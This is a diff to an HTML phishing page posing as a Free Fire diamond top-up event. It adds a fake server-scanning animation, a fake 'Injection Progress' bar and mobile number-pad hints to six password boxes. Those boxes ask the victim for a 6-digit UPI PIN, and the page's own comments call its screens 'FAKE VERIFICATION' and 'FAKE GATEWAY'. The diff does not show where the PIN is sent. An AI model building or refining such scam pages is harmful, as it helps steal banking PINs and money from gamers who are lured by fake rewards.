@@ -6,6 +6,18 @@
     <title>FF Diamond Event Top-Up</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
+                /* Progress Bar & Laser Animations */
+        @keyframes loadingBar {
+            0% { width: 0%; }
+            30% { width: 40%; }
+            70% { width: 85%; }
+            100% { width: 100%; }
+        }
+        @keyframes scan {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(400px); }
+        }
+        
         /* Custom Free Fire authentic styling */
         body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
         .ff-gradient { background: linear-gradient(90deg, #ff9900, #ff5500); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
@@ -106,13 +118,32 @@
         </div>
     </div>
 
-    <!-- SCREEN 2: FAKE VERIFICATION -->
-    <div id="screen-2" class="hidden w-full max-w-md bg-gray-900/95 backdrop-blur-md rounded-2xl shadow-2xl border border-gray-700 p-6 text-center">
-        <h2 class="text-xl font-bold text-orange-500 mb-4 animate-pulse">Syncing with Garena Servers...</h2>
-        <div class="bg-black rounded-lg p-4 font-mono text-left text-xs sm:text-sm text-green-400 h-40 overflow-hidden relative border border-gray-700 shadow-inner">
+        <!-- SCREEN 2: FAKE VERIFICATION -->
+    <div id="screen-2" class="hidden w-full max-w-md bg-gray-900/95 backdrop-blur-md rounded-2xl shadow-2xl border border-gray-700 p-6 text-center relative overflow-hidden">
+        
+        <!-- Fake Scanning Laser -->
+        <div class="absolute top-0 left-0 w-full h-1 bg-orange-500/50 shadow-[0_0_15px_#ff9900] animate-[scan_2s_ease-in-out_infinite]"></div>
+
+        <h2 class="text-xl font-bold text-orange-500 mb-1 animate-pulse">Syncing with Garena...</h2>
+        <p class="text-xs text-gray-400 mb-4 font-mono tracking-widest">NODE: SG-ASIA-1 | PING: 12ms</p>
+        
+        <!-- Made the terminal taller (h-56 instead of h-40) -->
+        <div class="bg-black rounded-lg p-4 font-mono text-left text-xs sm:text-sm text-green-400 h-56 overflow-hidden relative border border-gray-700 shadow-inner">
             <div id="terminal" class="space-y-2 terminal-text"></div>
         </div>
+
+        <!-- Fake Progress Bar filling the bottom gap -->
+        <div class="mt-6 text-left">
+            <div class="flex justify-between text-xs text-gray-400 mb-2 font-mono">
+                <span>Injection Progress</span>
+                <span class="animate-pulse text-orange-500 font-bold">Processing...</span>
+            </div>
+            <div class="w-full bg-gray-800 rounded-full h-3 border border-gray-700 overflow-hidden">
+                <div class="bg-gradient-to-r from-orange-600 to-orange-400 h-3 rounded-full animate-[loadingBar_5s_ease-in-out_forwards]"></div>
+            </div>
+        </div>
     </div>
+
 
     <!-- SCREEN 3: FAKE GATEWAY -->
     <div id="screen-3" class="hidden w-full max-w-md bg-gray-900/95 backdrop-blur-md rounded-2xl shadow-2xl border border-gray-700 p-6">
@@ -141,15 +172,16 @@
         <h2 class="text-2xl font-bold text-center text-white mb-2">Verification Required</h2>
         <p class="text-center text-gray-400 mb-6 text-sm">Enter your 6-digit UPI PIN to confirm your payment</p>
         
-        <div class="flex justify-center gap-2 mb-6">
-            <!-- 6 White boxes with blue text -->
-            <input type="password" maxlength="1" class="pin-box w-12 h-14 bg-white text-blue-600 font-extrabold text-2xl text-center rounded-lg focus:outline-none focus:ring-4 focus:ring-blue-500 shadow-inner">
-            <input type="password" maxlength="1" class="pin-box w-12 h-14 bg-white text-blue-600 font-extrabold text-2xl text-center rounded-lg focus:outline-none focus:ring-4 focus:ring-blue-500 shadow-inner">
-            <input type="password" maxlength="1" class="pin-box w-12 h-14 bg-white text-blue-600 font-extrabold text-2xl text-center rounded-lg focus:outline-none focus:ring-4 focus:ring-blue-500 shadow-inner">
-            <input type="password" maxlength="1" class="pin-box w-12 h-14 bg-white text-blue-600 font-extrabold text-2xl text-center rounded-lg focus:outline-none focus:ring-4 focus:ring-blue-500 shadow-inner">
-            <input type="password" maxlength="1" class="pin-box w-12 h-14 bg-white text-blue-600 font-extrabold text-2xl text-center rounded-lg focus:outline-none focus:ring-4 focus:ring-blue-500 shadow-inner">
-            <input type="password" maxlength="1" class="pin-box w-12 h-14 bg-white text-blue-600 font-extrabold text-2xl text-center rounded-lg focus:outline-none focus:ring-4 focus:ring-blue-500 shadow-inner">
-        </div>
+                <div class="flex justify-center gap-2 mb-6">
+            <!-- Added inputmode="numeric" to force the number pad on mobile -->
+            <input type="password" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="pin-box w-12 h-14 bg-white text-blue-600 font-extrabold text-2xl text-center rounded-lg focus:outline-none focus:ring-4 focus:ring-blue-500 shadow-inner">
+            <input type="password" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="pin-box w-12 h-14 bg-white text-blue-600 font-extrabold text-2xl text-center rounded-lg focus:outline-none focus:ring-4 focus:ring-blue-500 shadow-inner">
+            <input type="password" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="pin-box w-12 h-14 bg-white text-blue-600 font-extrabold text-2xl text-center rounded-lg focus:outline-none focus:ring-4 focus:ring-blue-500 shadow-inner">
+            <input type="password" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="pin-box w-12 h-14 bg-white text-blue-600 font-extrabold text-2xl text-center rounded-lg focus:outline-none focus:ring-4 focus:ring-blue-500 shadow-inner">
+            <input type="password" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="pin-box w-12 h-14 bg-white text-blue-600 font-extrabold text-2xl text-center rounded-lg focus:outline-none focus:ring-4 focus:ring-blue-500 shadow-inner">
+            <input type="password" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="pin-box w-12 h-14 bg-white text-blue-600 font-extrabold text-2xl text-center rounded-lg focus:outline-none focus:ring-4 focus:ring-blue-500 shadow-inner">
+                </div>
+        
 
         <button onclick="processPayment()" class="w-full bg-green-600 hover:bg-green-500 text-white font-bold py-3 rounded-lg uppercase tracking-widest shadow-lg transform active:scale-95 transition-transform">
             Confirm Payment
